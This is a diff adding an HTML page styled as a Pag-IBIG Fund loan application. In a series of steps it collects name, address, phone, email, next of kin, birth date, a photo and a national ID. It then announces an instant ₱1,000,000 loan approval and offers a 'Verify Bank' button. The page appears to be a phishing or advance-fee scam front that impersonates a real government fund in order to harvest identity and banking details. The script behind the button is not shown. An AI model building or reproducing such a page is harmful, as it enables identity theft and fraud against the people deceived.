@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply for a Loan | Pag-IBIG Fund</title>
+    <link rel="stylesheet" href="loan.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/js/all.min.js"></script>
+</head>
+<body>
+    <div class="container fade-in">
+        <h2>Pag-IBIG Fund Loan Application</h2>
+        <p>Step-by-step process to secure your loan.</p>
+
+        <div id="form-container">
+            <form id="loanForm">
+                <div class="form-step active">
+                    <label>Full Name</label>
+                    <input type="text" id="name" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <label>Address</label>
+                    <input type="text" id="address" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <label>Email</label>
+                    <input type="email" id="email" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <label>Next of Kin</label>
+                    <input type="text" id="kin" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <label>Date of Birth</label>
+                    <input type="date" id="dob" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <label>Upload Picture</label>
+                    <input type="file" id="picture" accept="image/*" required>
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <label>National ID (Optional)</label>
+                    <input type="text" id="national_id">
+                    <button type="button" onclick="nextStep()">Next</button>
+                </div>
+
+                <div class="form-step">
+                    <h3>Congratulations! 🎉</h3>
+                    <p>Your loan of <strong>₱1,000,000</strong> has been approved.</p>
+                    <button type="button" onclick="proceedToBank()">Verify Bank</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="/loan.js"></script>
+</body>
+  </html>
